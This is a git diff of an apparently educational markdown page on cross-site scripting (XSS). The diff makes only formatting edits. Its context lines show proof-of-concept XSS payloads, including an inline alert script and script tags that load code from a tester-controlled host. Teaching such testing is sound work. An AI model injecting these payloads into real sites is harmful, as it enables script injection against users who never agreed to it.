@@ -47,7 +47,7 @@ While in this last attack, an user just needs to open or navigate to an infected
 
 Usually, for a proof of concept (PoC) of an XSS attack exploring source-based flaws, security testers use one the following code.
 
-### 1. With `<script>` tag  
+### 1. With `<script>` tag
 
 ```javascript
 <script>alert(1)</script>
@@ -55,13 +55,13 @@ Usually, for a proof of concept (PoC) of an XSS attack exploring source-based fl
 
 or
 
-```js
+```javascript
 <script src=//HOST/SCRIPT></script>
 ```
 
 With HOST being a domain or IP address controlled by tester and SCRIPT being a script with alert(1) as content, like in:
 
-```js
+```javascript
 <script src=//brutelogic.com.br/1.js></script>
 ```
 
